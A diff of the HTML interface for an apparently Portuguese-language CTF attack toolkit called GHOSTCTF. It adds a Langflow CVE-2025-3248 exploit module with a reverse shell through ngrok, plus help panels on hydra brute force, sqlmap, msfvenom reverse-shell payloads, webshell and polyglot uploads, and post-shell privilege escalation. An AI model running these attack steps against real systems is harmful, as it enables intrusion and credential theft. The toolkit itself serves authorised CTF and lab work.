+        <div id="langflowCveModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+          <div class="section-label section-label--with-help" style="margin-bottom:6px">
+            <button type="button" class="sidebar-module-toggle" id="langflowCveModuleToggle" onclick="toggleSidebarPayloadModule('langflowCve')" aria-expanded="true" aria-controls="langflowCveModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <span class="section-label-heading">Langflow CVE<span class="section-label-subline">(2025-3248 + vértices)</span></span>
+            <span class="section-label-rule" aria-hidden="true"></span>
+          </div>
+          <div id="langflowCveModuleBody" class="sidebar-module-body">
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="langflowExploitProbe" id="modLangflowExploit"><div class="checkbox-box"></div><span class="checkbox-text">Langflow CVE-2025-3248 + opcional reverse (vértices)</span><span class="tag tag-med">OFF</span></label>
+        <input id="langflowHostHeaderInput" type="text" placeholder="Host: para nginx (ex.: flow.projects-blogo.sy)" style="width:100%;margin:4px 0;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <label style="display:flex;gap:8px;align-items:center;margin:6px 0;font-size:9px;color:var(--text-dim);cursor:pointer;user-select:none"><input type="checkbox" id="langflowTryAllOriginsChk"> Tentar todas as origens HTTP (sem pista OpenAPI/Langflow)</label>
+        <label style="display:flex;gap:8px;align-items:center;margin:6px 0;font-size:9px;color:var(--text-dim);cursor:pointer;user-select:none"><input type="checkbox" id="langflowAlsoFlagChk"> Depois de /etc/passwd tentar também <code>/flag.txt</code></label>
+        <label style="display:flex;gap:8px;align-items:center;margin:6px 0;font-size:9px;color:var(--text-dim);cursor:pointer;user-select:none"><input type="checkbox" id="langflowVerticesShellChk"> POST /api/v1/build/…/vertices → reverse shell (ngrok)</label>
+        <input id="langflowNgrokHostInput" type="text" placeholder="Ngrok TCP host (ex.: 0.tcp.sa.ngrok.io)" style="width:100%;margin:4px 0;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <input id="langflowNgrokPortInput" type="number" placeholder="Porta ngrok" style="width:100%;margin:0 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
+        <input id="langflowBuildFlowIdInput" type="text" value="00000000-0000-0000-0000-000000000001" style="width:100%;margin:0 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px" title="UUID no path /api/v1/build/{id}/vertices">
+          </div>
+        </div>
         <div id="extraHostsWrap" style="display:none;margin:6px 0 14px;padding:10px 12px;border:1px solid var(--border);background:var(--bg2)">
           <div style="font-size:9px;color:var(--text-dim);line-height:1.5;margin-bottom:8px">
             Configura antes no teu sistema <code style="color:var(--text-bright)">/etc/hosts</code> o mesmo IP do alvo (ex.: <code style="color:var(--text-bright)">3.4.5.6 challenge.ctf</code>). Aqui cola os <strong>mesmos</strong> hostnames — um por linha ou separados por vírgula. O Node corre no teu PC: o DNS/hosts local tem de resolver estes nomes para o IP.
@@ -1227,7 +1656,13 @@
       </div>
 
       <div class="module-group">
-        <div class="module-group-title">// Crack Mode</div>
+        <div id="crackModeModuleCard" class="sidebar-payload-card" style="padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+          <div class="section-label section-label--with-help" style="margin-bottom:6px">
+            <button type="button" class="sidebar-module-toggle" id="crackModeModuleToggle" onclick="toggleSidebarPayloadModule('crackMode')" aria-expanded="true" aria-controls="crackModeModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <span class="section-label-heading">Crack Mode</span>
+            <span class="section-label-rule" aria-hidden="true"></span>
+          </div>
+          <div id="crackModeModuleBody" class="sidebar-module-body">
         <div id="crackCapLine" style="font-family:var(--mono);font-size:9px;color:var(--text-dim);margin-bottom:8px;line-height:1.4">A detetar John/wordlists…</div>
         <input id="crackHashInput" type="text" placeholder="Hash MD5 (32 hex)" style="width:100%;margin-top:8px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
         <input id="crackWordlistInput" type="text" placeholder="Wordlist opcional (ex.: /usr/share/wordlists/rockyou.txt)" style="width:100%;margin-top:8px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
@@ -1261,6 +1696,8 @@
           <div style="display:flex;gap:8px;margin-top:8px">
             <button class="export-btn" onclick="runJohnCrackMode()">⚔ John crack</button>
             <button class="export-btn" onclick="document.getElementById('johnHashInput').value='';document.getElementById('johnFormatSelect').value='raw-sha256';document.getElementById('johnWordlistInput').value='';document.getElementById('johnRulesChk').checked=true;document.getElementById('johnIncrementalChk').checked=false;document.getElementById('johnIncrementalMode').value='Digits';">Limpar</button>
+          </div>
+        </div>
           </div>
         </div>
       </div>
@@ -1388,7 +1825,16 @@
       <!-- Findings Panel -->
       <div class="findings-panel">
         <div class="panel-header">
-          <div class="panel-title">FINDINGS</div>
+          <div class="findings-title-row">
+            <div class="panel-title">FINDINGS</div>
+            <button
+              type="button"
+              class="findings-help-btn"
+              id="findingsHelpBtn"
+              aria-label="O que são Findings?"
+              title="O que são Findings?"
+            >?</button>
+          </div>
           <div class="counter" id="findCount">0 achados</div>
         </div>
         <div class="filter-tabs" id="filterTabs">
@@ -1435,6 +1881,343 @@
       </div>
     </div>
 
+  </div>
+</div>
+
+<!-- Pop-up de ajuda: Findings + pipeline + filtros -->
+<div class="help-modal-overlay" id="findingsHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="findingsHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="findingsHelpClose" aria-label="Fechar">×</button>
+    <h2 id="findingsHelpTitle">O que são Findings?</h2>
+    <div class="help-modal-body">
+      <p>
+        <strong>Findings</strong> são os <strong>achados do recon</strong> que o GHOSTCTF vai acumulando ao longo do scan:
+        portas e serviços, URLs e tecnologias, parâmetros suspeitos, possíveis flags, credenciais vazadas, hits de módulos (LFI, SQLMap, WordPress, etc.) e sugestões de exploração.
+      </p>
+      <p>
+        Cada cartão resume um item; a <strong>faixa colorida à esquerda</strong> indica prioridade (vermelho = alto, ciano = médio, verde = baixo). Clica num cartão para ver mais detalhe no terminal, quando aplicável.
+      </p>
+      <h3>Barra de pipeline (acima)</h3>
+      <p>Mostra a <strong>fase atual</strong> do fluxo de trabalho, mapeada do recon clássico:</p>
+      <ul>
+        <li><strong>INPUT</strong> → alvo e opções</li>
+        <li><strong>NMAP + SERVICE PROBES</strong> → portas TCP/UDP e banners</li>
+        <li><strong>UDP / RDAP STAGE</strong> → estágio agregador (UDP / RDAP no modelo UI)</li>
+        <li><strong>WEB PROBE + LINKS</strong> → HTTP, cabeçalhos, links</li>
+        <li><strong>DIR ENUM / SURFACE</strong> → diretórios e superfície</li>
+        <li><strong>URL DISCOVERY</strong> → robots, sitemap, descoberta de URLs</li>
+        <li><strong>PARAMS + LFI/SQLMAP</strong> → parâmetros, LFI, SQLi</li>
+        <li><strong>JS / DECODING</strong> → decoding de flags em conteúdo</li>
+        <li><strong>DORKS / VALIDATION</strong> → validação e agrupamento</li>
+        <li><strong>SECRETS / ATTACK VECTORS</strong> → segredos e vetores (placeholder no MVP)</li>
+        <li><strong>KALI / EXPLOIT TOOLS</strong> → integração Kali (quando ligada)</li>
+        <li><strong>PRIORITIZE + SAVE</strong> → scoring e gravação do run</li>
+      </ul>
+      <h3>Filtros (tabs)</h3>
+      <p>
+        Cada tab aplica um critério ao campo interno do achado: <strong>prioridade</strong> (<code>prio</code>) ou <strong>tipo</strong> (<code>type</code>). Um cartão só aparece se corresponder à tab ativa.
+      </p>
+      <p><strong>Por gravidade (prioridade)</strong></p>
+      <ul>
+        <li><strong>ALL</strong> — lista completa, sem filtro; útil para rever tudo de uma vez.</li>
+        <li><strong>🔴 HIGH</strong> — só achados marcados como <em>alta</em> prioridade (ex.: flags, credenciais, LFI/SQLi fortes, brute bem-sucedido).</li>
+        <li><strong>🟡 MED</strong> — prioridade <em>média</em> (ex.: muitos endpoints técnicos, SQLMap sem enum completa, disclosure relevante).</li>
+        <li><strong>🟢 LOW</strong> — prioridade <em>baixa</em> (recon de rotina, tech genérico, ruído útil mas menos urgente).</li>
+      </ul>
+      <p><strong>Por tipo de achado</strong> — corresponde ao <code>type</code> guardado com cada finding:</p>
+      <ul>
+        <li><strong>ENDPOINTS</strong> — URLs, serviços contactados, caminhos descobertos (HTTP, FTP OK, MySQL handshake, etc.).</li>
+        <li><strong>PARAMS</strong> — parâmetros de URL / vetores (inclui LFI e outros testes em query).</li>
+        <li><strong>FLAGS</strong> — possíveis flags da plataforma (ex.: <code>Solyd{…}</code>) após validação/decoding.</li>
+        <li><strong>SECRETS</strong> — credenciais, comentários suspeitos, leaks em HTML/disclosure, credenciais de brute.</li>
+        <li><strong>NMAP</strong> — linhas de portas/serviços derivadas do scan.</li>
+        <li><strong>EXPLOIT.DB</strong> — entradas ligadas ao <code>searchsploit</code> / Exploit-DB (quando o módulo corre).</li>
+        <li><strong>NUCLEI</strong> — resultados Nuclei (quando integrados no fluxo / runs com essa origem).</li>
+        <li><strong>WPSCAN</strong> — achados do WPScan em JSON (plugins, versões, issues).</li>
+        <li><strong>XSS</strong> — reflexões / indícios XSS classificados com este tipo.</li>
+        <li><strong>SQLI</strong> — injeção SQL / hits SQLMap (HTTP ou WebSocket).</li>
+        <li><strong>SEC</strong> — cabeçalhos e notas de <em>security</em> HTTP (CSP, HSTS, etc.) quando classificadas assim.</li>
+        <li><strong>TLS</strong> — informação de certificado / TLS quando existir finding dedicado.</li>
+        <li><strong>RDAP</strong> — dados RDAP/whois-style quando o pipeline emitir findings deste tipo.</li>
+      </ul>
+      <p>
+        Algumas tabs podem ficar <strong>vazias</strong> num run concreto (ex.: sem Nuclei, sem XSS) — isso é normal. A <strong>barra de estatísticas</strong> em baixo resume contagens globais; <strong>JSON / MD / TXT</strong> exportam tendo em conta a lista visível / filtro atual.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Modules (sidebar) -->
+<div class="help-modal-overlay" id="modulesHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="modulesHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="modulesHelpClose" aria-label="Fechar">×</button>
+    <h2 id="modulesHelpTitle">Módulos e opções</h2>
+    <div class="help-modal-body">
+      <p>
+        Os <strong>checkboxes e radios</strong> abaixo de <strong>Modules</strong> ligam blocos do pipeline GhostCTF no servidor local.
+        Só ativa o que precisas: módulos <strong>agressivos</strong> (brute force, Langflow exploit) exigem <strong>autorização explícita</strong> / CTF.
+      </p>
+
+      <h3>Plataformas CTF</h3>
+      <p>Define o <strong>formato de flag</strong> e heurísticas de deteção (ex.: <code>Solyd{…}</code> vs outros). Uma plataforma fica <strong>ATIVA</strong> de cada vez.</p>
+
+      <h3>Recon options</h3>
+      <ul>
+        <li><strong>UDP scan</strong> — nmap UDP no IP (mais lento).</li>
+        <li><strong>TCP all ports (-p-)</strong> — varre todas as portas TCP em vez do conjunto rápido.</li>
+        <li><strong>Exploit-DB</strong> — cruza serviços/portas com <code>searchsploit</code> (se disponível).</li>
+        <li><strong>LFI probe</strong> — testa parâmetros suspeitos com payloads tipo <code>/etc/passwd</code> (PHP).</li>
+        <li><strong>SQLMap probe</strong> — URLs com query string; <code>sqlmap --batch --level=3 --risk=3 --dbs</code> (subset de alvos).</li>
+        <li><strong>SQLMap WebSocket</strong> — procura <code>ws://</code>/<code>wss://</code> no HTML e tenta sqlmap com JSON <code>*</code>.</li>
+        <li><strong>VHost + Sitemap + .well-known</strong> — pedidos extra por virtual host, sitemap e ficheiros well-known.</li>
+        <li><strong>Upload surface</strong> — após o crawl de links, analisa o HTML obtido por <code>curl</code> por <code>input type=file</code> ou <code>enctype=multipart/form-data</code>; emite findings e o playbook sugere payload + upload manual. Não envia ficheiros ao alvo.</li>
+        <li><strong>Disclosure Hunt</strong> — comentários HTML, paths sensíveis (<code>.env</code>, <code>wp-config</code>, …) e extração de credenciais.</li>
+        <li><strong>Credential Reuse</strong> — reaproveita credenciais encontradas em <strong>FTP</strong> e <strong>HTTP Basic</strong> (requer Disclosure ligado para alimentar creds).</li>
+        <li><strong>WordPress Focus</strong> — <code>wp-login</code>, xmlrpc, <code>wp-json</code>, plugins, enum de users.</li>
+        <li><strong>WPScan</strong> — ferramenta externa pesada; JSON para findings (opcional).</li>
+        <li><strong>Hostnames (/etc/hosts)</strong> — após recon no IP, repete lógica web com nomes que colas (o teu SO tem de resolver esses nomes para o IP do alvo). Opção <strong>só hostnames</strong> evita curl inicial em <code>http(s)://IP</code>.</li>
+      </ul>
+
+      <h3>Extended (lacunas típicas)</h3>
+      <ul>
+        <li><strong>Tiny File Manager</strong> — se a página parecer TFM, tenta POST com credenciais CTF comuns.</li>
+        <li><strong>ActiveMQ</strong> — <code>GET :8161</code>; intel sobre túnel SSH e CVEs (ex.: OpenWire).</li>
+        <li><strong>Mail + SMB</strong> — banners POP3/IMAP/SMTP e <code>smbclient -L</code> quando as portas existem.</li>
+        <li><strong>MySQL em IPs extra</strong> — handshake em 3306 noutros IPv4 (ex.: DB noutra VM); cola IPs na caixa.</li>
+        <li><strong>OpenAPI</strong> — pede <code>/openapi.json</code>, <code>/v3/api-docs</code>, etc. (útil Langflow/FastAPI).</li>
+        <li><strong>VHost prefix fuzz</strong> — compara corpo HTTP com <code>Host: &lt;prefix&gt;.&lt;domínio&gt;</code>; preenche domínio apex e prefixos extra.</li>
+      </ul>
+
+      <h3>Agressivo (só CTF / autorização)</h3>
+      <ul>
+        <li>
+          <strong>SSH brute (hydra)</strong> — até <strong>três fases</strong> opcionais, <em>nesta ordem</em> (se uma encontrar credencial, as seguintes não correm):
+          <ol>
+            <li><strong>Subset manual</strong> — preenches utilizadores (textarea) + caminho absoluto da wordlist no teu disco. Só corre se <strong>ambos</strong> estiverem preenchidos. O servidor usa um <em>recorte</em> da wordlist (máx. linhas configurável) para não disparar milhões de tentativas de uma vez.</li>
+            <li><strong>Wordlists Solyd</strong> — com o checkbox dedicado, o hydra usa <code>wordlists/usersolyd.txt</code> e <code>wordlists/passwordsolyd.txt</code> na <strong>raiz do projeto GHOSTCTF</strong> (listas agregadas a partir do histórico/write-ups Solyd). Corre <strong>depois</strong> do subset e <strong>antes</strong> do rockyou completo; é mais curto que o SecLists+rockyou.</li>
+            <li><strong>Hydra automático (SecLists + rockyou.gz)</strong> — <strong>última</strong> fase, com timeout longo (minutos); combinações enormes — <strong>pode demorar muito</strong>. Requer o respetivo checkbox e ficheiros típicos de Kali (<code>top-usernames-shortlist.txt</code>, <code>rockyou.txt.gz</code> ou <code>rockyou.txt</code>).</li>
+          </ol>
+          Podes correr só Solyd ou só automático deixando o subset manual vazio, desde que ligues as opções certas e o <strong>SSH brute</strong> base.
+        </li>
+        <li><strong>WP brute (hydra)</strong> — <code>http(s)-post-form</code> em <code>wp-login.php</code>; precisa de users + wordlist e URLs WP descobertos.</li>
+        <li><strong>Langflow CVE-2025-3248</strong> — exploração de validate/code e opcional vértices / reverse shell; extremamente sensível — só em lab.</li>
+      </ul>
+
+      <h3>Crack Mode</h3>
+      <p>
+        Não faz parte do stream do recon: corre no servidor via API <strong>sob demanda</strong>.
+        <strong>MD5 crack</strong> — hash 32 hex + wordlist opcional.
+        A linha <code>john:✓</code> / <code>fallback-wordlist</code> indica se o John e wordlists foram detetados no host.
+      </p>
+      <p>
+        <strong>John Crack</strong> — cola o hash, escolhe <strong>formato</strong> (<code>raw-md5</code>, <code>bcrypt</code>, …), wordlist opcional.
+        <strong>rules</strong> aplica regras do John; <strong>incremental</strong> gera candidatos por modo (Digits/Alnum/ASCII) quando não há wordlist ou como complemento.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Msfvenom (manual) -->
+<div class="help-modal-overlay" id="msfvenomManualHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="msfvenomManualHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="msfvenomManualHelpClose" aria-label="Fechar">×</button>
+    <h2 id="msfvenomManualHelpTitle">Msfvenom (manual)</h2>
+    <div class="help-modal-body">
+      <p>
+        Bloco só para <strong>linha de comandos</strong> no Kali: copias <code>msfvenom</code> / <code>msfconsole</code> ou descarregas um <code>.php</code> pelo browser.
+        Os <strong>LHOST/LPORT</strong> aqui são <strong>independentes</strong> do bloco <strong>Wandenreich</strong> (automação e pasta <code>payloads/</code>).
+      </p>
+      <h3>Metasploit</h3>
+      <p>
+        <code>msfvenom</code> gera o payload; <code>msfconsole</code> com <code>exploit/multi/handler</code> recebe a shell.
+        <strong>LHOST</strong> = alcançável pelo alvo; <strong>LPORT</strong> = onde o handler escuta.
+      </p>
+      <ul>
+        <li><strong>php/reverse_php</strong> — PHP no alvo (upload + execução).</li>
+        <li><strong>linux/x64/shell_reverse_tcp</strong> — ELF Linux 64-bit.</li>
+      </ul>
+      <h3>Ngrok (mesma lógica que Wandenreich)</h3>
+      <p>
+        <strong>Porta local (nc)</strong> deve ser a que o <code>ngrok tcp</code> encaminha (ex. 4444).
+        <strong>Ler ngrok</strong> / <strong>Iniciar ngrok tcp + preencher</strong> atualizam só os campos <strong>LHOST/LPORT deste bloco</strong> (para copiar <code>msfvenom</code> ou descarregar .php).
+      </p>
+      <p>
+        <strong>Descarregar</strong> chama a API e guarda o ficheiro nas <strong>transferências</strong> do browser — não escreve em <code>payloads/</code>.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Wandenreich -->
+<div class="help-modal-overlay" id="wandenreichHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="wandenreichHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="wandenreichHelpClose" aria-label="Fechar">×</button>
+    <h2 id="wandenreichHelpTitle">Wandenreich — payloads automáticos</h2>
+    <div class="help-modal-body">
+      <p>
+        <strong>Wandenreich</strong> concentra a <strong>criação automática</strong> de ficheiros no repositório (<code>payloads/</code>), integração <strong>ngrok</strong> e <strong>mini-nc</strong>.
+        O <strong>recon</strong> (Upload surface) só sugere formulários — o upload no alvo é sempre <strong>manual</strong>.
+      </p>
+      <h3>Ngrok</h3>
+      <p>
+        Túnel <strong>TCP</strong> público (ex. <code>0.tcp….ngrok.io:15248</code>) → porta local do <code>nc</code>.
+        API local: <code>http://127.0.0.1:4040/api/tunnels</code> ou <code>GHOSTCTF_NGROK_API</code>.
+      </p>
+      <ul>
+        <li><strong>Ler ngrok → LHOST/LPORT</strong> — com <code>ngrok tcp &lt;porta local&gt;</code> a correr, preenche o endpoint <strong>público</strong> nos campos do payload.</li>
+        <li><strong>Iniciar ngrok tcp + preencher</strong> — o servidor tenta arrancar <code>ngrok tcp</code> e faz poll (PATH + authtoken).</li>
+        <li><strong>Porta local</strong> = destino do túnel e do mini-nc; <strong>LPORT</strong> no payload com ngrok é a porta <strong>pública</strong>.</li>
+      </ul>
+      <h3>Pasta payloads/</h3>
+      <ul>
+        <li>Ficheiros na <strong>raiz do projeto</strong> GHOSTCTF (<code>payloads/</code>), úteis para <code>python3 -m http.server</code> ou upload no alvo.</li>
+        <li><strong>Tipo de ficheiro</strong> — escolhe no menu (PHP, shell, Python, Perl, Ruby, Node, JSP, PDF+PHP polyglot, PowerShell, webshell).</li>
+        <li><strong>Gravar + mini-nc</strong> — para payloads <strong>reverse TCP</strong>, abre o painel e <code>nc -nlvp</code> na <strong>porta local</strong>; webshell não usa listener.</li>
+        <li><strong>PDF + PHP</strong> — cabeçalho PDF mínimo + mesmo reverse PHP (cenários de upload/LFI em CTF); o alvo tem de interpretar PHP no contexto do desafio.</li>
+      </ul>
+      <p>
+        <strong>curl</strong> (exemplo): <code>curl -k -F "ficheiro=@shell.php" …</code> — o <code>name</code> do campo deve bater com o HTML.
+      </p>
+      <p style="margin-top:12px;font-size:11px;color:var(--text-dim)">
+        Para o passo a passo <strong>depois da reverse ligar</strong> (listar ficheiros, achar o que enviaste, flags), usa o botão <strong>Manual</strong> no bloco Wandenreich.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Manual pós-shell: Wandenreich -->
+<div class="help-modal-overlay" id="wandenreichPostShellManualOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="wandenreichPostShellManualTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="wandenreichPostShellManualClose" aria-label="Fechar">×</button>
+    <h2 id="wandenreichPostShellManualTitle">Manual — depois da shell reversa ligar</h2>
+    <div class="help-modal-body">
+      <p>
+        Quando o <strong>mini-nc</strong> ou o teu <code>nc -nlvp</code> mostra uma linha de comando, estás dentro do <strong>servidor alvo</strong> (muitas vezes como <code>www-data</code>, <code>apache</code>, etc.).
+        Isto é um guia de <strong>enumeração inicial</strong> em CTF / lab autorizado — não é “lista de vírus”; é ver <strong>onde estás</strong>, <strong>que ficheiros há</strong> e <strong>onde pode estar o payload que enviaste</strong>.
+      </p>
+      <h3>Alvos e sessões — há comando para “ver alvos e escolher”?</h3>
+      <p>
+        <strong>Não dentro do mini-nc do GhostCTF nem do netcat clássico numa única porta.</strong>
+        Um <code>nc -nlvp 4444</code> (ou o mini-terminal ligado ao mesmo WebSocket) aceita <strong>uma ligação de cada vez</strong> nessa porta: quando o payload conecta, a shell que vês é <strong>só essa</strong>. Não há lista integrada de “todos os alvos” nem menu para trocar de sessão — isso não faz parte do protocolo TCP simples do <code>nc</code>.
+      </p>
+      <ul>
+        <li><strong>Várias shells ou várias máquinas</strong> — usa <strong>portas diferentes</strong> e um listener por porta (ex.: <code>4444</code>, <code>4445</code>), ou terminais separados no Kali, cada um com o seu <code>nc</code>.</li>
+        <li><strong>Listar sessões e escolher uma</strong> — típico no <strong>Metasploit</strong>: após o handler receber reverses, corre <code>sessions -l</code> para ver a tabela de sessões e <code>sessions -i 1</code> (troca <code>1</code> pelo ID) para interagir com a que quiseres. Exemplo de arranque: <code>msfconsole -q -x "use exploit/multi/handler; set payload php/reverse_php; set LHOST …; set LPORT …; exploit -j"</code> (ajusta payload/LHOST/LPORT).</li>
+        <li><strong>Ferramentas com gestão de múltiplas shells</strong> — por exemplo <strong>pwncat-cs</strong>, <strong>Sliver</strong>, ou frameworks comerciais; o fluxo do Wandenreich + ficheiro em <code>payloads/</code> continua igual; só mudas o <strong>listener</strong> no teu lado.</li>
+      </ul>
+      <p style="font-size:11px;color:var(--text-dim)">
+        Resumo: o payload “escolhe” o alvo no momento em que corre <strong>na máquina onde foi executado</strong>; no teu PC escolhes <strong>qual listener</strong> (qual porta / qual ferramenta) está à espera dessa ligação.
+      </p>
+      <h3>1. Confirmar a sessão</h3>
+      <ul>
+        <li><code>whoami</code> — utilizador atual.</li>
+        <li><code>id</code> — grupos (útil para saber se há <code>docker</code>, <code>sudo</code>, etc.).</li>
+        <li><code>hostname</code> · <code>pwd</code> — máquina e diretório atual (muitas vezes a pasta do site).</li>
+        <li><code>uname -a</code> — kernel (pistas para exploit local).</li>
+      </ul>
+      <h3>2. Ver ficheiros “à volta” (lista no alvo)</h3>
+      <ul>
+        <li><code>ls -la</code> — conteúdo do diretório atual, incluindo ocultos.</li>
+        <li><code>ls -la ..</code> — pasta pai (subir um nível).</li>
+        <li><code>find . -maxdepth 3 -type f 2&gt;/dev/null | head -50</code> — amostra de ficheiros próximos sem inundar o terminal.</li>
+      </ul>
+      <h3>3. Onde está o ficheiro que enviaste (payload / upload)</h3>
+      <p>
+        O GhostCTF grava no <strong>teu PC</strong> em <code>payloads/rev_…</code> ou <code>cmd.php</code>; no <strong>alvo</strong> o ficheiro fica onde o upload ou o RCE o colocou (caminho depende do desafio).
+      </p>
+      <ul>
+        <li>Se acabaste de obter shell <strong>via web</strong>, começa por <code>pwd</code> e <code>ls -la</code> — costuma ser algo como <code>/var/www/html</code>, <code>/var/www/…/uploads</code>, <code>/home/…/public_html</code>.</li>
+        <li>Procurar pelo nome que usaste (ex.: <code>rev_</code>, <code>.php</code>):<br><code>find /var/www -name '*.php' 2&gt;/dev/null | head -30</code></li>
+        <li>Alternativa mais larga (pode ser lenta):<br><code>find / -name 'cmd.php' 2&gt;/dev/null</code> ou parte do nome do ficheiro gravado.</li>
+      </ul>
+      <p>
+        Ver o ficheiro no alvo serve para <strong>confirmar o caminho</strong>, apagar vestígios em lab, ou perceber <strong>permissões</strong> (quem pode ler/escrever).
+      </p>
+      <h3>4. O que fazer a seguir (CTF típico)</h3>
+      <ul>
+        <li>Procurar flags: <code>ls -la /home/*</code>, <code>cat flag.txt</code>, <code>find / -name 'flag*' 2&gt;/dev/null | head</code> (ajusta ao formato do desafio).</li>
+        <li>Ficheiros sensíveis: <code>.env</code>, configs em <code>/var/www</code>, backups <code>.bak</code>, chaves SSH em <code>~/.ssh</code> se tiveres acesso.</li>
+        <li>Escalar privilégios: <code>sudo -l</code>, binários SUID (<code>find / -perm -4000 2&gt;/dev/null</code>), cron (<code>cat /etc/crontab</code>), serviços em portas internas.</li>
+      </ul>
+      <h3>5. Melhorar o terminal</h3>
+      <p>
+        A shell pode vir “crua”. Na sidebar, o bloco <strong>Shell reversa — PTY</strong> tem a sequência <code>script</code> / <code>TERM</code> / <code>python3 -c … pty</code> para autocomplete e Ctrl+C mais seguros.
+      </p>
+      <p style="margin-top:14px;font-size:11px;color:var(--text-dim)">
+        Usa apenas em alvos que <strong>te pertençam</strong> ou com <strong>autorização explícita</strong> (CTF, pentest contratado).
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Decode rápido -->
+<div class="help-modal-overlay" id="decodeHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="decodeHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="decodeHelpClose" aria-label="Fechar">×</button>
+    <h2 id="decodeHelpTitle">Decode rápido (Base64 / Base32)</h2>
+    <div class="help-modal-body">
+      <p>
+        Cola na caixa texto que suspeites estar em <strong>Base64</strong> ou <strong>Base32</strong> (muito comum em CTF: flags escondidas em páginas, cookies, JWT payload, etc.).
+        O botão <strong>Decode</strong> envia o conteúdo ao servidor, que tenta decodificar de forma tolerante (padding, URL-safe Base64).
+      </p>
+      <p>
+        <strong>Base64</strong> — alfabeto A–Z, a–z, 0–9, <code>+</code>/<code>/</code> (ou <code>-</code>/<code>_</code> na variante URL). O output é texto UTF-8 quando possível.
+      </p>
+      <p>
+        <strong>Base32</strong> — letras A–Z e dígitos 2–7; por vezes usado em desafios e OTP. Se a string não for válida, o decode falha com mensagem clara.
+      </p>
+      <p>
+        O botão <strong># Hash</strong> calcula um hash rápido do texto colado (útil para comparar com hashes conhecidos ou encadear com o modo <strong>Crack</strong> mais abaixo). Tudo isto corre <strong>só quando carregas no botão</strong> — não faz parte do pipeline automático do recon.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Shell reversa PTY -->
+<div class="help-modal-overlay" id="ptyHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="ptyHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="ptyHelpClose" aria-label="Fechar">×</button>
+    <h2 id="ptyHelpTitle">Shell reversa — PTY</h2>
+    <div class="help-modal-body">
+      <p>
+        Quando recebes uma shell com <code>nc</code> ou payload sem TTY, o terminal está <strong>cru</strong>: sem autocomplete, <code>Ctrl+C</code> pode matar a sessão, e editores como <code>vim</code> não funcionam bem.
+        A sequência abaixo <strong>no alvo</strong> aloca um pseudo-terminal (PTY) e melhora a experiência.
+      </p>
+      <p><strong>Ordem recomendada (cola uma linha de cada vez):</strong></p>
+      <ol>
+        <li><code>script -qc /bin/bash /dev/null</code> — arranca uma shell dentro do utilitário <code>script</code>, com pseudo-TTY (método muito usado em CTF; o binário pode ser <code>bash</code> ou <code>sh</code> conforme o alvo).</li>
+        <li><code>export TERM=xterm</code> — diz ao sistema que o terminal remoto comporta-se como xterm (cores, teclas especiais, <code>clear</code>, etc.).</li>
+        <li><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> — reforça uma shell interativa com PTY (se não houver <code>python3</code>, tenta <code>python</code> no alvo).</li>
+      </ol>
+      <p>
+        Usa os botões <strong>Copiar</strong> ao lado de cada linha para colar no alvo sem erros de aspas.
+        Alternativa clássica: no teu <code>nc</code> fazer <code>Ctrl+Z</code>, depois <code>stty raw -echo; fg</code> e Enter — a sequência ①②③ costuma ser mais simples em write-ups Solyd.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Ajuda: Servidor HTTP atacante -->
+<div class="help-modal-overlay" id="httpServeHelpOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="httpServeHelpTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="httpServeHelpClose" aria-label="Fechar">×</button>
+    <h2 id="httpServeHelpTitle">Servidor HTTP (máquina atacante)</h2>
+    <div class="help-modal-body">
+      <p>
+        Serve ficheiros da <strong>tua</strong> máquina (Kali/host) para o <strong>alvo</strong> descarregar com <code>wget</code> ou <code>curl</code> — típico em CTF para passar exploits, <code>linpeas</code>, chaves ou scripts quando já tens execução de comandos no servidor.
+      </p>
+      <p>
+        Define a <strong>porta</strong> (ex.: <code>8000</code>) e carrega em <strong>Copiar python3 -m http.server</strong>. No diretório onde estão os ficheiros que queres expor, corre o comando no teu terminal.
+      </p>
+      <p>
